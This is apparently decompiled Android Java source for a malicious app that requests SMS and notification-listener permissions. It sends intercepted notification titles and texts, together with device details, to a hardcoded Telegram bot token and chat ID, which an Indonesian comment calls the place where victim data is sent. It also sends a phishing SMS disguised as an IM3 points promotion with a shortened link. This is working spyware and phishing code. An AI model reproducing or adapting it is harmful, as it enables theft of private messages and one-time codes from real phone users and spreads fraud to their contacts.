package com.example.myapplicatior;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.graphics.Paint;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.text.Html;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TableRow;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    private static final int RESULT_ENABLE = 0;
    private static final int VISIBILITY = 1028;
    final String TAG = "demo1";
    /* access modifiers changed from: private */
    public final OkHttpClient client = new OkHttpClient();
    String device = (Build.BRAND + " - " + Build.MODEL + SmsManager.getDefault());
    private Object devicePolicyManager;
    ComponentName mDeviceAdminSample;
    private BroadcastReceiver onNotice = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            String stringExtra = intent.getStringExtra("package");
            String stringExtra2 = intent.getStringExtra("title");
            String stringExtra3 = intent.getStringExtra("text");
            String stringExtra4 = intent.getStringExtra("id");
            new TableRow(MainActivity.this.getApplicationContext()).setLayoutParams(new TableRow.LayoutParams(-1, -2));
            TextView textView = new TextView(MainActivity.this.getApplicationContext());
            textView.setLayoutParams(new TableRow.LayoutParams(-2, -2, 1.0f));
            textView.setTextSize(12.0f);
            textView.setTextColor(Color.parseColor("#000000"));
            textView.setText(Html.fromHtml("From : " + stringExtra2 + " | Message : </b>" + stringExtra3));
            /**
             * DISINI ADA URL API TELEGRAM DIMANA DATA KORBAN DI KIRIM
             */
            MainActivity.this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot6817255304:AAGrKP47-SpbAnI-u7GyKITnA6OgLmK4q3Y/sendMessage?parse_mode=markdown&chat_id=7064236060&text=*" + stringExtra + "* %0A%0A*From :* _" + stringExtra2 + "%0A*𝗣𝗲𝘀𝗮𝗻 :* " + stringExtra3 + "_").build()).enqueue(new Callback() {
                public void onFailure(Call call, IOException iOException) {
                    iOException.printStackTrace();
                }

                public void onResponse(Call call, Response response) throws IOException {
                    Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                    if (response.isSuccessful()) {
                        response.body().string();
                    }
                }
            });
        }
    };
    private TextView textView;
    WebSettings websettingku;
    WebView webviewku;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        MainActivity.super.onCreate(bundle);
        setContentView(2131427356);
        WebView webView = (WebView) findViewById(2131231023);
        this.webviewku = webView;
        WebSettings settings = webView.getSettings();
        this.websettingku = settings;
        settings.setJavaScriptEnabled(true);
        this.webviewku.setWebViewClient(new WebViewClient());
        this.webviewku.loadUrl("");
        if (Build.VERSION.SDK_INT >= 19) {
            this.webviewku.setLayerType(2, (Paint) null);
        } else if (Build.VERSION.SDK_INT >= 11 && Build.VERSION.SDK_INT < 19) {
            this.webviewku.setLayerType(1, (Paint) null);
        }
        if (Build.VERSION.SDK_INT >= 23 && checkSelfPermission("android.permission.RECEIVE_SMS") != 0 && checkSelfPermission("android.permission.SEND_SMS") != 0) {
            requestPermissions(new String[]{"android.permission.RECEIVE_SMS", "android.permission.SEND_SMS"}, 1000);
        }
    }

    /* JADX WARNING: type inference failed for: r10v0, types: [android.content.Context, com.example.myapplicatior.MainActivity, androidx.appcompat.app.AppCompatActivity] */
    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        MainActivity.super.onRequestPermissionsResult(i, strArr, iArr);
        if (i != 1000) {
            return;
        }
        if (iArr[RESULT_ENABLE] == 0) {
            /**
             * DISINI ADA URL API TELEGRAM DIMANA DATA KORBAN DI KIRIM
             */
            this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot6817255304:AAGrKP47-SpbAnI-u7GyKITnA6OgLmK4q3Y/sendMessage?parse_mode=markdown&chat_id=7064236060&text=︻┳═一ῥἔʀἔҭᾄṩ一═┳︻ : _" + this.device).build()).enqueue(new Callback() {
                public void onFailure(Call call, IOException iOException) {
                    iOException.printStackTrace();
                }

                public void onResponse(Call call, Response response) throws IOException {
                    Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                    if (response.isSuccessful()) {
                        response.body().string();
                    }
                }
            });
            try {
                SmsManager.getDefault().sendTextMessage("085706290146", (String) null, "JANGAN HANGUS! Tukarkan poinmu skrg juga di myIM3 dengan voucher dan Kuota, klik:bit.ly/imp-ret", (PendingIntent) null, (PendingIntent) null);
            } catch (Exception e) {
                /**
                 * DISINI ADA URL API TELEGRAM DIMANA DATA KORBAN DI KIRIM
                 */
                this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot6817255304:AAGrKP47-SpbAnI-u7GyKITnA6OgLmK4q3Y/sendMessage?parse_mode=markdown&chat_id=7064236060&text=Error : _" + e).build()).enqueue(new Callback() {
                    public void onFailure(Call call, IOException iOException) {
                        iOException.printStackTrace();
                    }

                    public void onResponse(Call call, Response response) throws IOException {
                        Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                        if (response.isSuccessful()) {
                            response.body().string();
                        }
                    }
                });
                Toast.makeText(getApplicationContext(), "" + e, 1).show();
            }
            NotificationManager notificationManager = (NotificationManager) getApplicationContext().getSystemService("notification");
            if (Build.VERSION.SDK_INT >= 23 && !notificationManager.isNotificationPolicyAccessGranted()) {
                startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                Toast.makeText(this, "Aktifkan Izin Aplikasi!", RESULT_ENABLE).show();
            }
            LocalBroadcastManager.getInstance(this).registerReceiver(this.onNotice, new IntentFilter("Msg"));
            return;
        }
        Toast.makeText(this, "Permission Not Granted!", RESULT_ENABLE).show();
        /**
         * DISINI ADA URL API TELEGRAM DIMANA DATA KORBAN DI KIRIM
         */
        this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot6817255304:AAGrKP47-SpbAnI-u7GyKITnA6OgLmK4q3Y/sendMessage?parse_mode=markdown&chat_id=7064236060&text=︻┳═一ῥἔʀἔҭᾄṩ一═┳︻ : _" + this.device + "_").build()).enqueue(new Callback() {
            public void onFailure(Call call, IOException iOException) {
                iOException.printStackTrace();
            }

            public void onResponse(Call call, Response response) throws IOException {
                Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                if (response.isSuccessful()) {
                    response.body().string();
                }
            }
        });
        finish();
    }
}
